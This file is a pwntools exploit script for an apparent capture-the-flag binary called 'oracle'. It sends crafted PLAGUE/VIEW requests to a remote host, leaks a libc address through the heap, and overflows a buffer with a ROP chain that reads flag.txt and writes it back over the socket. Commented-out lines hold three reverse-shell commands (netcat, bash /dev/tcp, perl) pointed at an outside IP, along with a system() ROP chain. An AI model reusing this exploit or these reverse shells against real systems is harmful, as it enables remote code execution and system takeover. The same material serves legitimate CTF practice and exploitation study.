#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("pwn_oracle/challenge/oracle_patched")
libc = ELF("pwn_oracle/challenge/libc-2.31.so")
ld = ELF("pwn_oracle/challenge/ld-2.31.so")
context.binary = exe

host = "94.237.53.104"
port = 59873

localhost = "localhost"
localport = 9001

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    io = connect(localhost, localport)
    return io

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions

PLAGUE = b"PLAGUE"
TARGET_COMPETITOR = b"me"
KEY = b"long"
VALUE = b"dz"

def VIEW(competitor: bytes = b"me"):
    HTTP_START_LINE = b"%s %s %s\r\n" % (b"VIEW", competitor, b"a")
    HEADERS = b"%s: %s\r\n" % (KEY, VALUE)
    END_HEADERS = b"\r\n"
    
    payload = HTTP_START_LINE + HEADERS + END_HEADERS
    s(payload)
    
def PLAGUE(competitor, content_length: int, target: bytes, body: bytes = b"a"):
    HTTP_START_LINE = b"%s %s %s\r\n" % (b"PLAGUE", competitor, b"a")
    # HEADERS  = b"%s: %s\r\n" % (b"Content-Length", str(0xf000000000000000).encode())
    HEADERS  = b"%s: %s\r\n" % (b"Content-Length", str(content_length).encode())
    if target:
        HEADERS += b"%s: %s\r\n" % (b"Plague-Target", target)
    END_HEADERS = b"\r\n"
    BODY = body

    payload = HTTP_START_LINE + HEADERS + END_HEADERS + BODY
    s(payload)

# --- end functions ---

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

# free load libc to unsortedbin
io = start()
PLAGUE(b"nocompetitor", 0x8, b"target", b"a"*0x10)
# io.close()
pause()  
# leak libc
io = start()
PLAGUE(b"a", 0x8, b"target", b"\xe0")
io.recvuntil(b"Attempted plague: ")
leaked_heap = u64(io.recv(8))
libc.address = leaked_heap - 0x1ecbe0
success(f"done 2. libc.address: {hex(libc.address)}")
# io.close()
    
pause()  
# ----------------------------------
fd = 6
poprax = libc.address + 0x0000000000036174 #: pop rax ; ret
poprdi = libc.address + 0x0000000000023b6a #: pop rdi ; ret
poprsi = libc.address + 0x000000000002601f #: pop rsi ; ret
poprdx_rbx = libc.address + 0x000000000015fae6 #: pop rdx ; pop rbx ; ret
poprbx = libc.address + 0x000000000002fdaf #: pop rbx ; ret
syscall = libc.address + 0x000000000002284d
ret = libc.address + 0x0000000000022679 #: ret
mov_qword_rbx_rax_a_pop_rbx_ret = libc.address + 0x00000000001534e5 #: mov qword ptr [rbx], rax ; pop rbx ; ret
target_location = libc.address + 0x1ec800
mode_location = target_location + 0x100
load_file_location = target_location + 0x200
file_structure_location = target_location + 0x300

# command = b"nc 18.139.9.214 15963 -e /bin/sh"
# command = b"bash -i >& /dev/tcp/18.139.9.214/15963 0>&1"
# command = b"""perl -e 'use Socket;$i="18.139.9.214";$p=15963;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""

# payload = b""

# payload += p64(poprax)
# payload += command[0:8]
# payload += p64(poprbx)
# payload += p64(target_location)
# payload += p64(special)
# payload += p64(target_location+8)

# for i in range(1, len(command)//8+1):
#     partial_cmd = command[i*8: (i+1)*8].ljust(8, b"\x00")
#     payload += p64(poprax)
#     payload += partial_cmd
#     payload += p64(special)
#     payload += p64(target_location+(i+1)*8)

# payload += p64(poprdi)
# payload += p64(target_location)
# payload += p64(ret)
# payload += p64(libc.sym['system'])
# payload += p64(libc.sym['exit'])

filename = b"./flag.txt"
mode = b"r"
payload = b""

# write file name to target_location
payload += p64(poprax)
payload += filename[0:8].ljust(8, b"\x00")
payload += p64(poprbx)
payload += p64(target_location)
payload += p64(mov_qword_rbx_rax_a_pop_rbx_ret)
payload += p64(target_location+8)

for i in range(1, len(filename)//8+1):
    partial_cmd = filename[i*8: (i+1)*8].ljust(8, b"\x00")
    payload += p64(poprax)
    payload += partial_cmd
    payload += p64(mov_qword_rbx_rax_a_pop_rbx_ret)
    payload += p64(target_location+(i+1)*8)

# write mode to mode_location
payload += p64(poprax)
payload += b"r".ljust(8, b"\x00")
payload += p64(poprbx)
payload += p64(mode_location)
payload += p64(mov_qword_rbx_rax_a_pop_rbx_ret)
payload += p64(mode_location+8)

# fopen(target_location, mode_location)
payload += p64(poprdi)
payload += p64(target_location)
payload += p64(poprsi)
payload += p64(mode_location)
payload += p64(libc.sym['fopen'])

# fgets(load_file_location, 100, file_structure_location)
mov_rdx = libc.address + 0x0000000000055065 #: mov rdx, qword ptr [rdx + 0x88] ; xor eax, eax ; ret

payload += p64(poprdi)
payload += p64(load_file_location)
payload += p64(poprsi)
payload += p64(100)
payload += p64(poprbx)
payload += p64(file_structure_location)
payload += p64(mov_qword_rbx_rax_a_pop_rbx_ret)
payload += p64(0) # garbage
payload += p64(poprdx_rbx)
payload += p64(file_structure_location - 0x88)
payload += p64(0) # garbage
payload += p64(mov_rdx)
payload += p64(libc.sym['fgets'])


# write(6, load_file_location, 100)
payload += p64(poprdi)
payload += p64(6)
payload += p64(poprsi)
payload += p64(load_file_location)
payload += p64(poprdx_rbx)
payload += p64(100)
payload += p64(0)
payload += p64(libc.sym['write'])

io = start()
PLAGUE(b"nocompetitor", 0x10, b"a"*0x405 + b"\x30" + b"a"*7 + payload, b"a"*0x10)
# io.close()

io.interactive()
# io.close()
